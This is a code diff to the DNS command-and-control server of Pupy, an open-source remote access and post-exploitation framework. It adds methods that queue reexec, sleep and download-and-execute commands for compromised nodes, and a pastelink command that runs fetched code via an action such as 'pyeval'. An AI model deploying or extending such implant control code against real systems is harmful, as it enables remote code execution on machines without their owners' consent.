@@ -33,12 +33,26 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
     def disconnect(self, node=None, default=False):
         return self.add_command(Disconnect(), session=node, default=default)
 
+    def reexec(self, node=None, default=False):
+        return self.add_command(Reexec(), session=node, default=default)
+
+    def sleep(self, timeout, node=None, default=False):
+        return self.add_command(Sleep(timeout), session=node, default=default)
+
     def exit(self, node=None, default=False):
         return self.add_command(Exit(), session=node, default=default)
 
-    def pastelink(self, url, action, node=None, default=None):
-        return self.add_command(PasteLink(url, action=action), session=node, default=default)
+    def dexec(self, url, action, proxy=False, node=None, default=None):
+        return self.add_command(
+            DownloadExec(url, action=action, proxy=proxy),
+            session=node, default=default
+        )
 
+    def pastelink(self, url, action, node=None, default=None):
+        return self.add_command(
+            PasteLink(url, action=action),
+            session=node, default=default
+        )
 
 class PupyDnsCnc(object):
     def __init__(
@@ -95,8 +109,17 @@ class PupyDnsCnc(object):
     def exit(self, **kwargs):
         return self.handler.exit(**kwargs)
 
+    def sleep(self, *args, **kwargs):
+        return self.handler.sleep(*args, **kwargs)
+
+    def reexec(self, **kwargs):
+        return self.handler.reexec(**kwargs)
+
     def reset(self, **kwargs):
         return self.handler.reset_commands(**kwargs)
+
+    def dexec(self, *args, **kwargs):
+        return self.handler.dexec(*args, **kwargs)
 
     def pastelink(self, content=None, url=None, action='pyeval', node=None, default=False):
         if not ( content or url ):
@@ -134,8 +157,8 @@ class PupyDnsCnc(object):
             'kex': self.handler.kex,
         }
 
-    def set_policy(self, kex, timeout, interval):
-        return self.handler.set_policy(kex=kex, timeout=timeout, interval=interval)
+    def set_policy(self, *args, **kwargs):
+        return self.handler.set_policy(*args, **kwargs)
 
     @property
     def dirty(self):
